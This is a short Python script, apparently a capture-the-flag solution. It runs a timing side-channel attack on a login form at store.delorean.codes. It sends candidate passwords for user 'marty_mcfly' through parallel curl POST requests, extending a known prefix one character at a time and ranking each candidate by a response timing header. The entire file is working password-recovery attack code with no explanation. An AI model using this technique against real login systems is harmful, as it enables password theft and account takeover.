#!/usr/bin/env python
# pylint:disable=missing-docstring,invalid-name

import multiprocessing
import subprocess
import urllib


def get_time(pwd):
    url = 'https://store.delorean.codes/u/MathSquared/login'

    query = urllib.urlencode({
        'username': 'marty_mcfly',
        'password': pwd,
    })

    cmd = ['curl']
    #cmd.extend(['-o', '/dev/null'])  # bitbucket
    cmd.extend(['-i'])  # response headers
    cmd.extend(['-X', 'POST'])  # method
    cmd.extend(['-H', 'Content-Type: application/x-www-form-urlencoded'])
    cmd.extend(['-d', query, url])

    pipe = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, _ = pipe.communicate()

    return [x.split()[1] for x in out.splitlines() if 'Upstream' in x]


def main():
    ls = list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')

    p = multiprocessing.Pool(62)
    arr = p.map(get_time, ['2H5igrW7G%s' % ch for ch in ls])
    for ch, time in zip(ls, arr):
        print '%s -> %s' % (ch, time)

if __name__ == '__main__':
    main()
